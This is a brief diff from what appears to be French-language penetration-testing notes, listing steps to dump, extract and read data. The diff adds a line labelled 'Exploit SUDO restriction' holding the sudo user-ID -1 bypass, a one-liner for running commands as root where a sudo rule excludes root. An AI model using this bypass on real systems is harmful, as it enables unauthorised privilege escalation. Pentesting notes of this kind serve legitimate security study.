@@ -371,5 +371,7 @@ Syntaxe : sudo -u#-1 ...
 #2 -> En extraire les données ( extractor.sh /home/kali/Document/Dumped /home/kali/Document/Extracted )
 #3 -> Les lires
 
+#Exploit SUDO restriction
+sudo -u#-1 <COMMAND>
 
 ----
